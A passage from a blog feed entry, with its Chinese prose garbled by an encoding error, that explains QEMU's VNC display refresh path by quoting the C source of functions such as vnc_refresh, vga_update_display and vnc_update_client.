id="äºŒã€dpy-refresh-éå†-dcl-å¹¶è°ƒç”¨-dcl-gt-ops-gt-dpy-refresh-è¿›è¡Œæ›´æ–°"><a href="#äºŒã€dpy-refresh-éå†-dcl-å¹¶è°ƒç”¨-dcl-gt-ops-gt-dpy-refresh-è¿›è¡Œæ›´æ–°" class="headerlink" title="äºŒã€dpy_refresh - éå† dcl å¹¶è°ƒç”¨ dcl-&gt;ops-&gt;dpy_refresh è¿›è¡Œæ›´æ–°"></a>äºŒã€dpy_refresh - éå† dcl å¹¶è°ƒç”¨ dcl-&gt;ops-&gt;dpy_refresh è¿›è¡Œæ›´æ–°</h2><p><code>dpy_refresh()</code> æ¯”è¾ƒç®€å•ï¼Œä¸»è¦å°±æ˜¯éå† DisplayState ä¸­çš„æ‰€æœ‰ DisplayChangeListener å¹¶è°ƒç”¨ <code>dcl-&gt;ops-&gt;dpy_refresh()</code>ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">dpy_refresh</span><span class="hljs-params">(DisplayState *s)</span><br>&#123;<br>    DisplayChangeListener *dcl;<br><br>    QLIST_FOREACH(dcl, &amp;s-&gt;listeners, next) &#123;<br>        <span class="hljs-keyword">if</span> (dcl-&gt;ops-&gt;dpy_refresh) &#123;<br>            dcl-&gt;ops-&gt;dpy_refresh(dcl);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸»è¦å…³æ³¨ä¸ VNC æœ‰å…³çš„éƒ¨åˆ†ï¼Œå¯¹äº VNC è€Œè¨€ï¼Œå…¶ <code>dcl-&gt;ops-&gt;dpy_refresh</code> åº”ä¸º <code>vnc_refresh</code>ï¼Œè¯¥å‡½æ•°å®šä¹‰äº <code>ui/vnc.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">vnc_refresh</span><span class="hljs-params">(DisplayChangeListener *dcl)</span><br>&#123;<br>    VncDisplay *vd = container_of(dcl, VncDisplay, dcl);<br>    VncState *vs, *vn;<br>    <span class="hljs-type">int</span> has_dirty, rects = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (QTAILQ_EMPTY(&amp;vd-&gt;clients)) &#123;   <span class="hljs-comment">// æ²¡æœ‰ clientï¼Œç›´æ¥è¿”å›</span><br>        update_displaychangelistener(&amp;vd-&gt;dcl, VNC_REFRESH_INTERVAL_MAX);   <span class="hljs-comment">//æ›´æ–°è®¡æ—¶</span><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    graphic_hw_update(vd-&gt;dcl.con); <span class="hljs-comment">// ç¡¬ä»¶æ›´æ–°</span><br><br>    <span class="hljs-keyword">if</span> (vnc_trylock_display(vd)) &#123;<br>        update_displaychangelistener(&amp;vd-&gt;dcl, VNC_REFRESH_INTERVAL_BASE);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    has_dirty = vnc_refresh_server_surface(vd); <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æœ‰å¾…æ›´æ–°æ•°æ®</span><br>    vnc_unlock_display(vd);<br><br>    QTAILQ_FOREACH_SAFE(vs, &amp;vd-&gt;clients, next, vn) &#123;<br>        rects += vnc_update_client(vs, has_dirty);  <span class="hljs-comment">// éå†æ›´æ–° client</span><br>        <span class="hljs-comment">/* vs might be free()ed here */</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (has_dirty &amp;&amp; rects) &#123;<br>        vd-&gt;dcl.update_interval /= <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span> (vd-&gt;dcl.update_interval &lt; VNC_REFRESH_INTERVAL_BASE) &#123;<br>            vd-&gt;dcl.update_interval = VNC_REFRESH_INTERVAL_BASE;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        vd-&gt;dcl.update_interval += VNC_REFRESH_INTERVAL_INC;<br>        <span class="hljs-keyword">if</span> (vd-&gt;dcl.update_interval &gt; VNC_REFRESH_INTERVAL_MAX) &#123;<br>            vd-&gt;dcl.update_interval = VNC_REFRESH_INTERVAL_MAX;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ä¸»è¦æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>æ£€æŸ¥æ˜¯å¦æœ‰è¿æ¥çš„å®¢æˆ·ç«¯ï¼Œè‹¥å¦åˆ™æ›´æ–°è®¡æ—¶åç›´æ¥è¿”å›</li><li>è°ƒç”¨ <code>graphic_hw_update()</code> æ›´æ–° dcl å¯¹åº”çš„ QemuConsole å¯¹åº”çš„ç¡¬ä»¶è®¾å¤‡</li><li>è°ƒç”¨ <code>vnc_refresh_server_surface()</code> æ£€æŸ¥æ˜¯å¦æœ‰ dirty åŒºåŸŸï¼ˆå¾…æ›´æ–°åŒºåŸŸï¼‰</li><li>éå† dcl ä¸Šçš„ clientï¼Œ è°ƒç”¨ <code>vnc_update_client()</code> åˆ›å»ºæ–°çš„ VncJob æŒ‚è½½åˆ°å…¨å±€é“¾è¡¨ä¸Šï¼Œç”± worker thread è¿›è¡Œæ¨é€</li></ul><h2 id="ä¸‰ã€graphic-hw-update-å›¾å½¢ç¡¬ä»¶æ•°æ®æ›´æ–°"><a href="#ä¸‰ã€graphic-hw-update-å›¾å½¢ç¡¬ä»¶æ•°æ®æ›´æ–°" class="headerlink" title="ä¸‰ã€graphic_hw_update - å›¾å½¢ç¡¬ä»¶æ•°æ®æ›´æ–°"></a>ä¸‰ã€graphic_hw_update - å›¾å½¢ç¡¬ä»¶æ•°æ®æ›´æ–°</h2><p>å‰é¢æˆ‘ä»¬æ¶‰åŠåˆ°çš„éƒ½æ˜¯ consoleã€vnc è¿™ä¸€å—çš„æ•°æ®æ›´æ–°ï¼Œå¹¶æ²¡æœ‰è§¦åŠåˆ°å®é™…çš„ç¡¬ä»¶æ–¹é¢ï¼ˆqemu æ¨¡æ‹Ÿæ˜¾å¡ç­‰ï¼‰çš„æ›´æ–°ï¼Œè¿™ä¸€å—å®é™…çš„æ›´æ–°æ˜¯ç”± <code>graphic_hw_update()</code> æ¥å®Œæˆçš„ï¼Œè¯¥å‡½æ•°å®šä¹‰äº <code>ui/console.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">graphic_hw_update</span><span class="hljs-params">(QemuConsole *con)</span><br>&#123;<br>    <span class="hljs-type">bool</span> async = <span class="hljs-literal">false</span>;<br>    con = con ? con : active_console;<br>    <span class="hljs-keyword">if</span> (!con) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (con-&gt;hw_ops-&gt;gfx_update) &#123;<br>        con-&gt;hw_ops-&gt;gfx_update(con-&gt;hw);<br>        async = con-&gt;hw_ops-&gt;gfx_update_async;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!async) &#123;<br>        graphic_hw_update_done(con);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å‰é¢æˆ‘ä»¬è®²åˆ°ä¸€ä¸ª QemuConsole å¯¹åº”ä¸€ä¸ªæ˜¾ç¤ºè®¾å¤‡ï¼Œå› æ­¤åœ¨ <code>graphic_hw_update()</code> å½“ä¸­ä¼šç›´æ¥è°ƒç”¨ <code>con-&gt;hw_ops-&gt;gfx_update()</code> æ¥å®Œæˆç¡¬ä»¶æ–¹é¢çš„æ•°æ®æ›´æ–°</p><p>å¦‚æœæ˜¯çº¯å­—ç¬¦å‹æ˜¾ç¤ºè®¾å¤‡ï¼Œåˆ™ä¸º <code>text_console_ops</code>ï¼Œå®šä¹‰äº <code>ui/console.c</code> ä¸­ï¼Œè¯¥å‡½æ•°è¡¨æ²¡æœ‰ <code>gfx_update</code> æŒ‡é’ˆï¼Œæ•…ä¼šç›´æ¥è¿”å›ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> GraphicHwOps text_console_ops = &#123;<br>    .invalidate  = text_console_invalidate,<br>    .text_update = text_console_update,<br>&#125;;<br></code></pre></td></tr></table></figure><p>å¯¹äºé»˜è®¤çš„å›¾å½¢åŒ–ç•Œé¢ï¼Œ<code>con-&gt;hw-&gt;ops</code> åº”ä¸º <code>vga_ops</code>ï¼Œå®šä¹‰äº <code>hw/display/vga.c</code> ä¸­ï¼Œå…¶ <code>gfx_update</code> æŒ‡é’ˆä¸º <code>vga_update_display</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> GraphicHwOps vga_ops = &#123;<br>    .invalidate  = vga_invalidate_display,<br>    .gfx_update  = vga_update_display,<br>    .text_update = vga_update_text,<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œä¸»è¦æ˜¯æ ¹æ®æŒ‡å®šçš„ç¡¬ä»¶å†³å®šçš„ï¼Œé»˜è®¤çš„å›¾å½¢ç•Œé¢ä¾¿æ˜¯ <code>vga_ops</code>ï¼Œå¦‚æœä½ åœ¨å¯åŠ¨æ—¶æŒ‡å®šäº†ä¸€ä¸ª QXL æ˜¾å¡ï¼Œé‚£ä¹ˆè¿™é‡Œå°±åº”è¯¥æ˜¯ <code>qxl_ops</code>ï¼Œæœ€ç»ˆè°ƒç”¨åˆ° <code>qxl_hw_update()</code></p></blockquote><p>è¯¥å‡½æ•°å®šä¹‰äº <code>hw/display/vga.c</code> ä¸­ï¼Œä¸»è¦ä½œç”¨å°±æ˜¯æ ¹æ®æ˜¾ç¤ºæ¨¡å¼è°ƒç”¨ä¸åŒçš„æ›´æ–°å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">vga_update_display</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque)</span><br>&#123;<br>    VGACommonState *s = opaque;<br>    DisplaySurface *surface = qemu_console_surface(s-&gt;con);<br>    <span class="hljs-type">int</span> full_update, graphic_mode;<br><br>    qemu_flush_coalesced_mmio_buffer();<br><br>    <span class="hljs-keyword">if</span> (surface_bits_per_pixel(surface) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">/* nothing to do */</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        full_update = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (!(s-&gt;ar_index &amp; <span class="hljs-number">0x20</span>)) &#123;<br>            graphic_mode = GMODE_BLANK;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            graphic_mode = s-&gt;gr[VGA_GFX_MISC] &amp; VGA_GR06_GRAPHICS_MODE;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (graphic_mode != s-&gt;graphic_mode) &#123;<br>            s-&gt;graphic_mode = graphic_mode;<br>            s-&gt;cursor_blink_time = qemu_clock_get_ms(QEMU_CLOCK_VIRTUAL);<br>            full_update = <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">switch</span>(graphic_mode) &#123;<br>        <span class="hljs-keyword">case</span> GMODE_TEXT:<br>            vga_draw_text(s, full_update);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> GMODE_GRAPH:<br>            vga_draw_graphic(s, full_update);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> GMODE_BLANK:<br>        <span class="hljs-keyword">default</span>:<br>            vga_draw_blank(s, full_update);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™äº› <code>vga_draw_*</code> å‡½æ•°æœ€åéƒ½ä¼šè°ƒç”¨åˆ° <code>dpy_gfx_update()</code> å°†æ›´æ–°æ¨é€åˆ°æ˜¾ç¤ºè®¾å¤‡ä¸Šï¼Œå…¶å®šä¹‰äº <code>ui/console.c</code> ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">dpy_gfx_update</span><span class="hljs-params">(QemuConsole *con, <span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y, <span class="hljs-type">int</span> w, <span class="hljs-type">int</span> h)</span><br>&#123;<br>    DisplayState *s = con-&gt;ds;<br>    DisplayChangeListener *dcl;<br>    <span class="hljs-type">int</span> width = qemu_console_get_width(con, x + w);<br>    <span class="hljs-type">int</span> height = qemu_console_get_height(con, y + h);<br><br>    x = MAX(x, <span class="hljs-number">0</span>);<br>    y = MAX(y, <span class="hljs-number">0</span>);<br>    x = MIN(x, width);<br>    y = MIN(y, height);<br>    w = MIN(w, width - x);<br>    h = MIN(h, height - y);<br><br>    <span class="hljs-keyword">if</span> (!qemu_console_is_visible(con)) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    dpy_gfx_update_texture(con, con-&gt;surface, x, y, w, h);<br>    QLIST_FOREACH(dcl, &amp;s-&gt;listeners, next) &#123;<br>        <span class="hljs-keyword">if</span> (con != (dcl-&gt;con ? dcl-&gt;con : active_console)) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (dcl-&gt;ops-&gt;dpy_gfx_update) &#123;<br>            dcl-&gt;ops-&gt;dpy_gfx_update(dcl, x, y, w, h);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸»è¦æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>è‹¥ QemuConsole ä¸å¯è§†ï¼Œç›´æ¥è¿”å›</li><li>è°ƒç”¨ <code>dpy_gfx_update_texture()</code>ï¼Œå…¶æœ€ç»ˆä¼šè°ƒç”¨åˆ° <code>con-&gt;gl-&gt;ops-&gt;dpy_gl_ctx_update_texture()</code>ï¼Œè¿™ä¸€å—æ˜¯ä¸ GL ç›¸å…³çš„æ“ä½œï¼Œè¿™é‡Œæš‚ä¸”ä¸å±•å¼€</li><li>éå† QemuConsole ä¸Šçš„ DisplayChangeListenerï¼Œè°ƒç”¨ <code>dcl-&gt;ops-&gt;dpy_gfx_update()</code>ï¼Œæ›´æ–° dcl å¯¹åº”çš„ display è®¾å¤‡</li></ul><p>å¯¹äº VNC è€Œè¨€ï¼Œ<code>dcl-&gt;ops-&gt;dpy_gfx_update</code> æŒ‡é’ˆåº”ä¸º <code>vnc_dpy_update()</code> å‡½æ•°ï¼Œå®šä¹‰äº <code>ui/vnc.c</code> ä¸­ï¼Œä¸»è¦å°±æ˜¯è°ƒç”¨ <code>vnc_set_area_dirty()</code> å°†ä¸€å—åŒºåŸŸæ ‡è®°ä¸º dirtyï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">vnc_dpy_update</span><span class="hljs-params">(DisplayChangeListener *dcl,</span><br><span class="hljs-params">                           <span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y, <span class="hljs-type">int</span> w, <span class="hljs-type">int</span> h)</span><br>&#123;<br>    VncDisplay *vd = container_of(dcl, VncDisplay, dcl);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncSurface</span> *<span class="hljs-title">s</span> =</span> &amp;vd-&gt;guest;<br><br>    vnc_set_area_dirty(s-&gt;dirty, vd, x, y, w, h);<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆè¿™äº›è¢«æ ‡è®°ä¸º dirty çš„åŒºåŸŸä¼šåœ¨ <code>vnc_refresh()</code> ä¸­è°ƒç”¨ <code>vnc_refresh_server_surface()</code> æ—¶è¢«è¿›ä¸€æ­¥å¤„ç†ï¼Œåœ¨ <code>vnc_update_client()</code> ä¸­å˜ä¸ºæ–°çš„ VncJob é“¾åˆ°å…¨å±€é“¾è¡¨ä¸Š</p><h2 id="å››ã€vnc-client-update-åˆ›å»ºæ–°çš„-VncJob-æŒ‚è½½åˆ°å…¨å±€é“¾è¡¨ä¸Š"><a href="#å››ã€vnc-client-update-åˆ›å»ºæ–°çš„-VncJob-æŒ‚è½½åˆ°å…¨å±€é“¾è¡¨ä¸Š" class="headerlink" title="å››ã€vnc_client_update - åˆ›å»ºæ–°çš„ VncJob æŒ‚è½½åˆ°å…¨å±€é“¾è¡¨ä¸Š"></a>å››ã€vnc_client_update - åˆ›å»ºæ–°çš„ VncJob æŒ‚è½½åˆ°å…¨å±€é“¾è¡¨ä¸Š</h2><p>å½“å‰é¢æˆ‘ä»¬å°†ç‰¹å®šçš„æ˜¾ç¤ºåŒºåŸŸæ ‡è®°ä¸º dirty ä¹‹åï¼Œæœ€ç»ˆä¼šç”± <code>vnc_update_client()</code> å‡½æ•°æ¥æ‰«æ dirty åŒºåŸŸï¼Œå¹¶åˆ›å»ºç›¸åº”çš„ VncJob æŒ‚è½½åˆ°å…¨å±€çš„ queue ä¸Šï¼Œå› æ­¤æœ€åå®é™…ä¸Šè¿˜æ˜¯ç”± vnc worker thread å®Œæˆæ¨é€çš„ä»»åŠ¡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">vnc_update_client</span><span class="hljs-params">(VncState *vs, <span class="hljs-type">int</span> has_dirty)</span><br>&#123;<br>    VncDisplay *vd = vs-&gt;vd;<br>    VncJob *job;<br>    <span class="hljs-type">int</span> y;<br>    <span class="hljs-type">int</span> height, width;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (vs-&gt;disconnecting) &#123;<br>        vnc_disconnect_finish(vs);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    vs-&gt;has_dirty += has_dirty;<br>    <span class="hljs-keyword">if</span> (!vnc_should_update(vs)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!vs-&gt;has_dirty &amp;&amp; vs-&gt;update != VNC_STATE_UPDATE_FORCE) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Send screen updates to the vnc client using the server</span><br><span class="hljs-comment">     * surface and server dirty map.  guest surface updates</span><br><span class="hljs-comment">     * happening in parallel don&#x27;t disturb us, the next pass will</span><br><span class="hljs-comment">     * send them to the client.</span><br><span class="hljs-comment">     */</span><br>    job = vnc_job_new(vs);  <span class="hljs-comment">// åˆ›å»ºæ–°çš„ VncJob</span><br><br>    height = pixman_image_get_height(vd-&gt;server);<br>    width = pixman_image_get_width(vd-&gt;server);<br><br>    y = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-comment">// æ‰«æ dirty åŒºåŸŸ</span><br>        <span class="hljs-type">int</span> x, h;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> x2;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> offset = find_next_bit((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *) &amp;vs-&gt;dirty,<br>                                             height * VNC_DIRTY_BPL(vs),<br>                                             y * VNC_DIRTY_BPL(vs));<br>        <span class="hljs-keyword">if</span> (offset == height * VNC_DIRTY_BPL(vs)) &#123;<br>            <span class="hljs-comment">/* no more dirty bits */</span><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        y = offset / VNC_DIRTY_BPL(vs);<br>        x = offset % VNC_DIRTY_BPL(vs);<br>        x2 = find_next_zero_bit((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *) &amp;vs-&gt;dirty[y],<br>                                VNC_DIRTY_BPL(vs), x);<br>        bitmap_clear(vs-&gt;dirty[y], x, x2 - x);<br>        h = find_and_clear_dirty_height(vs, y, x, x2, height);<br>        x2 = MIN(x2, width / VNC_DIRTY_PIXELS_PER_BIT);<br>        <span class="hljs-keyword">if</span> (x2 &gt; x) &#123;<br>            <span class="hljs-comment">// åˆ›å»ºæ–°çš„ VncRectï¼ŒæŒ‚è½½åˆ° VncJob ä¸Š</span><br>            n += vnc_job_add_rect(job, x * VNC_DIRTY_PIXELS_PER_BIT, y,<br>                                  (x2 - x) * VNC_DIRTY_PIXELS_PER_BIT, h);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!x &amp;&amp; x2 == width / VNC_DIRTY_PIXELS_PER_BIT) &#123;<br>            y += h;<br>            <span class="hljs-keyword">if</span> (y == height) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    vs-&gt;job_update = vs-&gt;update;<br>    vs-&gt;update = VNC_STATE_UPDATE_NONE;<br>    vnc_job_push(job);  <span class="hljs-comment">// æŒ‚è½½åˆ°å…¨å±€ queue ä¸Š</span><br>    vs-&gt;has_dirty = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> n;<br>&#125;<br></code></pre></td></tr></table></figure><p>è‡³æ­¤ï¼ŒQemu ä¸­ VNC çš„å·¥ä½œæµç¨‹åŸºæœ¬åˆ†æå®Œæ¯•</p><h1 id="0xFF-æ€»è§ˆ"><a href="#0xFF-æ€»è§ˆ" class="headerlink" title="0xFF.æ€»è§ˆ"></a>0xFF.æ€»è§ˆ</h1><p>æœ€åè®©æˆ‘ä»¬é‡æ–°çœ‹ä¸€ä¸‹ Qemu VNC çš„åŸºæœ¬æ¶æ„ï¼Œè¿™é‡Œå†æ”¾ä¸€å¼ ä»<a href="https://zhuanlan.zhihu.com/p/69568087">çŸ¥ä¹</a>ä¸Šå·æ¥çš„ä¸€ä¸ª Qemu VNC çš„åŸºæœ¬æ¶æ„å›¾ï¼š</p><p><img src="https://s2.loli.net/2022/07/21/7BcC1jzxESl3ZWt.png" alt="image.png"></p><p>åœ¨ Qemu ä¸­å†…éƒ¨çš„æ˜¾ç¤ºç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/07/20/FUkehDzTocbtu4O.png" alt="image.png"></p><p>æœ€ç»ˆçš„æ›´æ–°è°ƒç”¨é“¾è·¯åˆ™å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/07/20/TVEaSGf7MgvjCO4.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;vncï¼ŒğŸ•éƒ½ä¸ç”¨&lt;/p&gt;</summary>
    
    
    
    <category term="VIRTUALIZATION" scheme="http://blog.arttnba3.cn/categories/VIRTUALIZATION/"/>
    
    
    <category term="å­¦ä¹ æœ­è®°" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="Qemu" scheme="http://blog.arttnba3.cn/tags/Qemu/"/>
    
    <category term="è™šæ‹ŸåŒ–" scheme="http://blog.arttnba3.cn/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="VNC" scheme="http://blog.arttnba3.cn/tags/VNC/"/>
    
  </entry>
  
  <entry>
    <title>ã€VIRT.0x00ã€‘Qemu - Iï¼šQemu ç®€æ˜“é£Ÿç”¨æŒ‡å—</title>
    <link href="http://blog.arttnba3.cn/2022/07/15/VIRTUALIZATION-0X00-QEMU-PART-I/"/>
    <id>http://blog.arttnba3.cn/2022/07/15/VIRTUALIZATION-0X00-QEMU-PART-I/</id>
    <published>2022-07-15T08:45:17.000Z</published>
    <updated>2023-04-13T08:36:31.720Z</updated>
    
